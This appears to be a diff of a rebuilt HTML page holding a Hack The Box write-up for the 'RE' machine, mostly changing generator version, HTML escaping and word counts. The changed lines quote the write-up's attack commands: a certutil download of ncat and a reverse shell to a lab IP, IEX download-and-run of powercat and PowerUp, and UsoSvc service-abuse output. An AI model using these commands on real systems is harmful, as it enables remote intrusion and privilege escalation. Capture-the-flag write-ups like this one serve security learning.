@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.92.2" />
+    <meta name="generator" content="Hugo 0.101.0" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Hack The Box Write-up - RE | text/plain</title>
@@ -287,7 +287,7 @@ since we get all the NT hashes and can pass them to WinRM,
 which can be accessed remotely after forwarding the port.
 "><meta itemprop="datePublished" content="2020-02-21T00:00:00+00:00" />
 <meta itemprop="dateModified" content="2020-02-21T00:00:00+00:00" />
-<meta itemprop="wordCount" content="2336"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="wordCount" content="1994"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
 <meta itemprop="keywords" content="ctf,infosec,hackthebox,write-up," />
     <script async src="/js/baffle.js"></script>
     <header>
@@ -297,7 +297,7 @@ which can be accessed remotely after forwarding the port.
   <circle cx="16" cy="16" r="14" />
   <path d="M16 8 L16 16 20 20" />
 </svg>
-<span>11 minute read</span>
+<span>10 minute read</span>
 <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
   <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
 </svg>
@@ -488,7 +488,7 @@ if you would follow the intended route (but I did not).</p>
 <p>If you ask yourself &ldquo;Where is this malware dropbox?&rdquo; then look at port 445.
 I listed shares and found one called &ldquo;<code>malware_dropbox</code>&rdquo; (type empty password):</p>
 <pre tabindex="0"><code>root@Kali:~# smbclient -N -L \\\\10.10.10.144
-Enter WORKGROUP\root's password:
+Enter WORKGROUP\root&#39;s password:
 
         Sharename       Type      Comment
         ---------       ----      -------
@@ -593,7 +593,7 @@ document), and hit &ldquo;New&rdquo;:</p>
 
 <p>This will create a new module. Give it a name and you will be dropped into the
 editor. To test for basic command execution I first added a simple pingback
-payload: &ldquo;<code>ping -n 1 10.10.15.130</code>&quot;:</p>
+payload: &ldquo;<code>ping -n 1 10.10.15.130</code>&rdquo;:</p>
 
 
 
@@ -708,8 +708,8 @@ dropbox and waited for a ping, which arrived after only a few seconds:</p>
 </style>
 
 <p>I went on to get a reverse shell using the following payload:</p>
-<pre tabindex="0"><code>Shell(&quot;certutil.exe -urlcache -split -f 'http://10.10.15.130/ncat.exe' 'C:\Windows\Temp\ncat.exe'&quot;)
-Shell(&quot;C:\Windows\Temp\ncat.exe --ssl -e cmd.exe 10.10.15.130 9001&quot;)
+<pre tabindex="0"><code>Shell(&#34;certutil.exe -urlcache -split -f &#39;http://10.10.15.130/ncat.exe&#39; &#39;C:\Windows\Temp\ncat.exe&#39;&#34;)
+Shell(&#34;C:\Windows\Temp\ncat.exe --ssl -e cmd.exe 10.10.15.130 9001&#34;)
 </code></pre>
 
 
@@ -753,57 +753,57 @@ PowerShell payloads.</p>
 <h3 id="discovering-the-winrar-vulnerability">Discovering the WinRAR vulnerability</h3>
 <p>In &ldquo;<code>C:\Users\luke\Documents</code>&rdquo; I found a file &ldquo;<code>process_samples.ps1</code>&rdquo; that
 seemed to be responsible for processing the uploads:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">$process_dir = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\malware_process&#34;</span>
-$files_to_analyze = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\ods&#34;</span>
-$yara = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\yara64.exe&#34;</span>
-$rule = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\ods.yara&#34;</span>
-
-<span style="color:#66d9ef">while</span>($true) {
-        <span style="color:#75715e"># Get new samples</span>
-        move C:\Users\luke\Documents\malware_dropbox\* $process_dir
-
-        <span style="color:#75715e"># copy each ods to zip file</span>
-        Get-ChildItem $process_dir -Filter *.ods |
-        Copy-Item -Destination {$_.fullname <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#34;.ods&#34;</span>, <span style="color:#e6db74">&#34;.zip&#34;</span>}
-
-        Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {
-
-                <span style="color:#75715e"># unzip archive to get access to content</span>
-                $unzipdir = Join-Path $_.directory $_.Basename
-                New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
-                Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir
-
-                <span style="color:#75715e"># yara to look for known malware</span>
-                $yara_out = &amp; $yara -r $rule $unzipdir
-                $ods_name = $_.fullname <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#34;.zip&#34;</span>, <span style="color:#e6db74">&#34;.ods&#34;</span>
-                <span style="color:#66d9ef">if</span> ($yara_out.length <span style="color:#f92672">-gt</span> 0) {
-                        Remove-Item $ods_name
-                }
-        }
-
-
-        <span style="color:#75715e"># if any ods files left, make sure they launch, and then archive:</span>
-        $files = ls $process_dir\*.ods
-        <span style="color:#66d9ef">if</span> ( $files.length <span style="color:#f92672">-gt</span> 0) {
-                <span style="color:#75715e"># launch ods files</span>
-                Invoke-Item <span style="color:#e6db74">&#34;C:\Users\luke\Documents\malware_process\*.ods&#34;</span>
-                Start-Sleep -s 5
-
-                <span style="color:#75715e"># kill open office, sleep</span>
-                Stop-Process -Name soffice*
-                Start-Sleep -s 5
-
-                <span style="color:#75715e">#&amp; &#39;C:\Program Files (x86)\WinRAR\Rar.exe&#39; a -ep $process_dir\temp.rar $process_dir\*.ods 2&gt;&amp;1 | Out-Null</span>
-                Compress-Archive -Path <span style="color:#e6db74">&#34;$process_dir\*.ods&#34;</span> -DestinationPath <span style="color:#e6db74">&#34;$process_dir\temp.zip&#34;</span>
-                $hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
-                <span style="color:#75715e"># Upstream processing may expect rars. Rename to .rar</span>
-                Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
-        }
-
-        Remove-Item -Recurse -force -Path $process_dir\*
-        Start-Sleep -s 5
-}
-</code></pre></div><p>It basically grabs all uploaded documents, unzips them, runs Yara on them and
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$process_dir = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\malware_process&#34;</span>
+</span></span><span style="display:flex;"><span>$files_to_analyze = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\ods&#34;</span>
+</span></span><span style="display:flex;"><span>$yara = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\yara64.exe&#34;</span>
+</span></span><span style="display:flex;"><span>$rule = <span style="color:#e6db74">&#34;C:\Users\luke\Documents\ods.yara&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span>($true) {
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># Get new samples</span>
+</span></span><span style="display:flex;"><span>        move C:\Users\luke\Documents\malware_dropbox\* $process_dir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># copy each ods to zip file</span>
+</span></span><span style="display:flex;"><span>        Get-ChildItem $process_dir -Filter *.ods |
+</span></span><span style="display:flex;"><span>        Copy-Item -Destination {$_.fullname <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#34;.ods&#34;</span>, <span style="color:#e6db74">&#34;.zip&#34;</span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Get-ChildItem $process_dir -Filter *.zip | ForEach-Object {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># unzip archive to get access to content</span>
+</span></span><span style="display:flex;"><span>                $unzipdir = Join-Path $_.directory $_.Basename
+</span></span><span style="display:flex;"><span>                New-Item -Force -ItemType directory -Path $unzipdir | Out-Null
+</span></span><span style="display:flex;"><span>                Expand-Archive $_.fullname -Force -ErrorAction SilentlyContinue -DestinationPath $unzipdir
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># yara to look for known malware</span>
+</span></span><span style="display:flex;"><span>                $yara_out = &amp; $yara -r $rule $unzipdir
+</span></span><span style="display:flex;"><span>                $ods_name = $_.fullname <span style="color:#f92672">-replace</span> <span style="color:#e6db74">&#34;.zip&#34;</span>, <span style="color:#e6db74">&#34;.ods&#34;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> ($yara_out.length <span style="color:#f92672">-gt</span> 0) {
+</span></span><span style="display:flex;"><span>                        Remove-Item $ods_name
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#75715e"># if any ods files left, make sure they launch, and then archive:</span>
+</span></span><span style="display:flex;"><span>        $files = ls $process_dir\*.ods
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( $files.length <span style="color:#f92672">-gt</span> 0) {
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># launch ods files</span>
+</span></span><span style="display:flex;"><span>                Invoke-Item <span style="color:#e6db74">&#34;C:\Users\luke\Documents\malware_process\*.ods&#34;</span>
+</span></span><span style="display:flex;"><span>                Start-Sleep -s 5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># kill open office, sleep</span>
+</span></span><span style="display:flex;"><span>                Stop-Process -Name soffice*
+</span></span><span style="display:flex;"><span>                Start-Sleep -s 5
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e">#&amp; &#39;C:\Program Files (x86)\WinRAR\Rar.exe&#39; a -ep $process_dir\temp.rar $process_dir\*.ods 2&gt;&amp;1 | Out-Null</span>
+</span></span><span style="display:flex;"><span>                Compress-Archive -Path <span style="color:#e6db74">&#34;$process_dir\*.ods&#34;</span> -DestinationPath <span style="color:#e6db74">&#34;$process_dir\temp.zip&#34;</span>
+</span></span><span style="display:flex;"><span>                $hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
+</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># Upstream processing may expect rars. Rename to .rar</span>
+</span></span><span style="display:flex;"><span>                Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        Remove-Item -Recurse -force -Path $process_dir\*
+</span></span><span style="display:flex;"><span>        Start-Sleep -s 5
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>It basically grabs all uploaded documents, unzips them, runs Yara on them and
 deletes all files that match, then launches all ODS files that are left.
 In the end it creates a RAR archive. The comment is a hint that some
 downstream processing would happen to it.
@@ -941,7 +941,7 @@ To do it I used
 I downloaded &ldquo;<code>powercat.ps1</code>&rdquo;, appended &ldquo;<code>powercat -c 10.10.15.130 -p 443 -ep</code>&rdquo;
 to make it send a Powershell reverse shell back. After setting up a listener
 with &ldquo;<code>nc -lnvp 443</code>&rdquo; I executed the following command through the web shell:
-&ldquo;<code>IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.130/powercat.ps1')</code>&quot;:</p>
+&ldquo;<code>IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.130/powercat.ps1')</code>&rdquo;:</p>
 
 
 
@@ -986,7 +986,7 @@ PowerShell support.</p>
 <a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1">PowerUp.ps1</a>
 and ran all checks. It brought up 2 findings, one of which was a vulnerable
 service called UsoSvc which I could abuse to execute code as SYSTEM.</p>
-<pre tabindex="0"><code>PS C:\windows\system32\inetsrv&gt; IEX (New-Object System.Net.WebClient).DownloadString('http://10.10.15.130/PowerUp.ps1')
+<pre tabindex="0"><code>PS C:\windows\system32\inetsrv&gt; IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://10.10.15.130/PowerUp.ps1&#39;)
 PS C:\windows\system32\inetsrv&gt; Invoke-AllChecks
 
 
@@ -1000,7 +1000,7 @@ Check       : Process Token Privileges
 ServiceName   : UsoSvc
 Path          : C:\Windows\system32\svchost.exe -k netsvcs -p
 StartName     : LocalSystem
-AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+AbuseFunction : Invoke-ServiceAbuse -Name &#39;UsoSvc&#39;
 CanRestart    : True
 Name          : UsoSvc
 Check         : Modifiable Services
@@ -1025,7 +1025,7 @@ NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory gro
 BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
 LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                      Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
-PS C:\Users\Public\Documents&gt; .\accesschk.exe -uwcqv &quot;NT AUTHORITY\SERVICE&quot; * /accepteula
+PS C:\Users\Public\Documents&gt; .\accesschk.exe -uwcqv &#34;NT AUTHORITY\SERVICE&#34; * /accepteula
 
 Accesschk v6.12 - Reports effective permissions for securable objects
 Copyright (C) 2006-2017 Mark Russinovich
@@ -1080,7 +1080,7 @@ Windows Service API, it would get killed shortly after launch.</p>
 <h2 id="pivoting-to-coby">Pivoting to coby</h2>
 <p>Apparently SYSTEM cannot read the flag because it is encrypted. After a short
 moment of WTF I learned it was due to the flag being encrypted by EFS.
-This can be check with &ldquo;<code>cipher /c &lt;file&gt;</code>&quot;:</p>
+This can be check with &ldquo;<code>cipher /c &lt;file&gt;</code>&rdquo;:</p>
 
 
 
@@ -1329,7 +1329,7 @@ shows you how to prepare the evil macro without LibreOffice.</li>
   
     and tagged <a href="/tags/ctf/">ctf</a>, <a href="/tags/hackthebox/">hackthebox</a>, <a href="/tags/infosec/">infosec</a> and <a href="/tags/write-up/">write-up</a>
   
-  using <span itemprop="wordCount">2336</span> words.
+  using <span itemprop="wordCount">1994</span> words.
 </p>
 
       
@@ -1340,10 +1340,10 @@ shows you how to prepare the evil macro without LibreOffice.</li>
     <ul>
       
         <li><a href="/post/htb_carrier/">Hack The Box Write-up - Carrier</a>
-        <time datetime="25M">25 minutes</time>
+        <time datetime="24M">24 minutes</time>
       
         <li><a href="/post/htb_access/">Hack The Box Write-up - Access</a>
-        <time datetime="11M">11 minutes</time>
+        <time datetime="10M">10 minutes</time>
       
         <li><a href="/post/htb_active/">Hack The Box Write-up - Active</a>
         <time datetime="12M">12 minutes</time>
